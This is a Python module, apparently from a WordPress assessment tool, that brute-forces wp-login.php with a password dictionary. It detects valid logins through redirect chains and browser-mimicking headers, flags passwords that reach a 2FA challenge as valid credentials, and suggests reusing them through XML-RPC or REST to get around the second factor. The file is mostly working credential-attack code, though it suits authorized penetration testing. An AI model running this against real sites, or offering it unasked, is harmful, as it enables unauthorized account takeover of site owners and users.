"""Weak-credential testing against wp-login.php.

Success is detected from the redirect chain, not from page text: a valid
login lands on /wp-admin/..., a failed one bounces back to wp-login.php.
That keeps the check working on translated dashboards (the old
'Log Out' string match failed on any non-English site).

Two-factor aware (P1-9): a CORRECT password can also bounce back to
wp-login.php - with a second-factor challenge instead of the login form.
Those responses are classified 'mfa' (credentials valid, factor pending)
and never as a wrong password.
"""

import re

from .. import httpclient

# challenge markers of the common WP 2FA plugins, plus the generic shapes
_MFA_CHALLENGE_RE = re.compile(
    r"two[- ]?factor|2fa|verification code|authenticator|"
    r"one[- ]?time (?:code|password)|totp|enter (?:the )?code", re.I)
# the plain login form asks for the password again - that is NOT a challenge
_LOGIN_FORM_RE = re.compile(r'name=["\']pwd["\']', re.I)


def login_outcome(resp):
    """'success' | 'mfa' | 'failed' for a wp-login.php POST response.

    Never match success on body text - the login form itself mentions
    wp-admin in its hidden redirect_to field.
    """
    final_url = (getattr(resp, "url", "") or "").lower()
    history = getattr(resp, "history", None) or []
    if "wp-admin" in final_url and "wp-login.php" not in final_url:
        return "success"
    if any("wp-admin" in (getattr(step, "url", "") or "").lower() for step in history):
        return "success"
    if "wp-login.php" in final_url:
        body = resp.text or ""
        if _MFA_CHALLENGE_RE.search(body) and not _LOGIN_FORM_RE.search(body):
            return "mfa"  # password accepted; a second factor is pending
        return "failed"
    return "success" if history else "failed"


def _login_succeeded(resp):
    """True when the credentials themselves were accepted ('mfa' included)."""
    return login_outcome(resp) != "failed"


def dictionary_attack(report, target, user, passwords):
    """POST dictionary against wp-login.php. Returns the working password or None."""
    print(f"[*] Testing {len(passwords)} passwords for user '{user}' via wp-login.php")
    for index, password in enumerate(passwords, 1):
        resp = httpclient.post(
            f"{target}wp-login.php",
            data={
                "log": user,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{target}wp-admin/",
                "testcookie": "1",
            },
            # exactly what a browser submits on the login form
            headers={
                "Cookie": "wordpress_test_cookie=WP%20Cookie%20check",
                "Origin": target.rstrip("/"),
                "Referer": f"{target}wp-login.php",
                "Sec-Fetch-Site": "same-origin",
            },
        )
        if resp is None:
            report.paragraph(f"wp-login.php became unreachable after {index - 1} attempts "
                             "(rate limiting?); credential testing aborted.")
            return None
        outcome = login_outcome(resp)
        if outcome == "success":
            return password
        if outcome == "mfa":
            print(f"[!] Password CORRECT for '{user}' - a 2FA challenge is pending")
            report.paragraph(f"**Credentials valid, MFA pending**: the password for `{user}` was "
                             f"accepted by wp-login.php; a second factor (authenticator app / "
                             f"verification code) is required to complete the login. The password "
                             f"is a working credential for any channel that bypasses the UI "
                             f"factor (XML-RPC with app-passwords, REST, other services).")
            return password
    return None
